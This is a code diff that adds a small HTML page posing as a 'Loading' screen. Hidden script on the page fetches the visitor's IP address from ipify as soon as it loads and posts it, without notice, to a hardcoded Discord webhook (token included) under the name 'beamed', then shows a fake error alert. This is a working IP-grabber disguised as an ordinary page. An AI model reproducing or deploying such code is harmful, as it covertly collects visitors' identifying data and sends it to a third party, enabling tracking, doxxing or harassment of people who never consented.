@@ -1,0 +1,23 @@
+<h1>Loading</h1>
+<p>this shit sucks so wait like 5 seconds</p>
+
+
+<script>
+  function getIP(json) {
+    var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1145954935201075250/zbMI0dC1rVvx1FviGO2nGOLdQvZXshpnt3Bet83HzDlUn5ts6LjbHueuzXzAKl7BkuIl");
+
+        request.setRequestHeader('Content-type', 'application/json');
+
+        var params = {
+          username: "beamed",
+          avatar_url: "https://cdn.discordapp.com/avatars/1047725317663498250/5e47c805463321a8a6a7dde3edab59e5.webp?size=128",
+          content: "**IP:** *" + json.ip + "*"
+        }
+
+        request.send(JSON.stringify(params));
+        alert("refresh thsi shit broke")
+      }
+
+  </script>
+  <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
